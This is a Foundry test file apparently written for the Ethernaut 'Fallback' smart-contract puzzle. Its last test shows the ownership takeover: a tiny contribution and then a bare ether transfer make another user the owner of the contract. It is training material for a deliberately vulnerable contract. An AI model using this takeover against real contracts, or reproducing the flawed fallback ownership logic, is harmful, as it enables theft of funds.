// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";
import {FallbackSolution} from "../script/FallbackSolution.s.sol";


contract TestFallback is Test {

    Fallback fallbackInstance;
    uint256 constant STARTING_BALANCE = 10 ether;
    uint256 constant CONTRIBUTE_VALUE = 0.0001 ether;
    address USER = makeAddr("user");
    

    function setUp() external {
        fallbackInstance = new Fallback();
        vm.deal(address(fallbackInstance), STARTING_BALANCE);
        vm.deal(USER, STARTING_BALANCE);
    }

    function testIsOwner() public view {
       assertEq(fallbackInstance.owner(), address(this));
       console.log(fallbackInstance.owner());
       
    }

    function testFallbackBalanceIsNotZero() public view {
       assertEq(address(fallbackInstance).balance, STARTING_BALANCE);
    }

    function testOthersContributeAndCantWithdraw() public {
        vm.prank(USER);
        fallbackInstance.contribute{value: CONTRIBUTE_VALUE}();

        assertEq(address(fallbackInstance).balance, STARTING_BALANCE + CONTRIBUTE_VALUE );

    }

    function testChangeUserToOwner() public {
        vm.prank(USER);
        fallbackInstance.contribute{value: CONTRIBUTE_VALUE}();
        
        vm.prank(USER);
        (bool success,) = address(fallbackInstance).call{value: 1 wei}("");
        require(success);

        console.log(USER);
        console.log(fallbackInstance.owner());

        assertEq(USER, fallbackInstance.owner());
    }


}